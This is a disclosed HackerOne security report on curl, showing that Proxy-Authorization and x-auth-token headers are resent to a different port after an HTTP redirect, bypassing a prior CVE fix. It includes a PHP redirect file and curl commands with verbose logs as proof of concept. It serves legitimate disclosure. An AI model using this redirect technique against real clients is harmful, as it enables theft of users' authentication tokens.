# Credential leak on redirect

## Report Details
- **Report ID**: 1568175
- **URL**: https://hackerone.com/reports/1568175
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-05-13T11:31:21.548Z
- **Disclosed**: 2022-05-14T16:06:25.527Z

## Reporter
- **Username**: iylz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
## Summary:
[add summary of the vulnerability]

Curl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect , like the Proxy-Authorization 、x-auth-token header. It is a bypass of fix https://hackerone.com/reports/1547048 , CVE-2022-27776 .

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Create a 302.php file, such as:
```
<?php
header("Location: http://a.com:8000");
?>
```
Add the 2 record in the /etc/hosts file:  
```
127.0.0.1 a.com
127.0.0.1 b.com
```
  2. curl -H "Proxy-Authorization: secrettoken" http://b.com/302.php -vv -L 
The redirect will be followed, and the confidential headers sent over insecure HTTP to the specified port:
```
# curl -H "Proxy-Authorization: secrettoken" http://b.com/302.php -vv -L
*   Trying 127.0.0.1:80...
* Connected to b.com (127.0.0.1) port 80 (#0)
> GET /302.php HTTP/1.1
> Host: b.com
> User-Agent: curl/7.83.1
> Accept: */*
> Proxy-Authorization: secrettoken
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Fri, 13 May 2022 11:22:06 GMT
< Server: Apache/2.4.6 (CentOS) PHP/5.4.16
< X-Powered-By: PHP/5.4.16
< Location: http://a.com:8000
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host b.com left intact
* Clear auth, redirects to port from 80 to 8000
* Issue another request to this URL: 'http://a.com:8000/'
*   Trying 127.0.0.1:8000...
* Connected to a.com (127.0.0.1) port 8000 (#1)
> GET / HTTP/1.1
> Host: a.com:8000
> User-Agent: curl/7.83.1
> Accept: */*
> Proxy-Authorization: secrettoken
>
```
  3.  curl -H "x-auth-token: secrettoken" http://b.com/302.php -vv -L 
```
# curl -H "x-auth-token: secrettoken" http://b.com/302.php -vv -L
*   Trying 127.0.0.1:80...
* Connected to b.com (127.0.0.1) port 80 (#0)
> GET /302.php HTTP/1.1
> Host: b.com
> User-Agent: curl/7.83.1
> Accept: */*
> x-auth-token: secrettoken
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Fri, 13 May 2022 11:24:15 GMT
< Server: Apache/2.4.6 (CentOS) PHP/5.4.16
< X-Powered-By: PHP/5.4.16
< Location: http://a.com:8000
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host b.com left intact
* Clear auth, redirects to port from 80 to 8000
* Issue another request to this URL: 'http://a.com:8000/'
*   Trying 127.0.0.1:8000...
* Connected to a.com (127.0.0.1) port 8000 (#1)
> GET / HTTP/1.1
> Host: a.com:8000
> User-Agent: curl/7.83.1
> Accept: */*
> x-auth-token: secrettoken
```

The reason for the problem is that curl's filtering of authentication header header is incomplete. The Proxy-Authorization and x-auth-token headers are not considered, only restrict the delivery of Cookies and Authorization.

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]
https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization

## Impact

Leak of Proxy-Authorization and x-auth-token headers.

## Attachments
No attachments
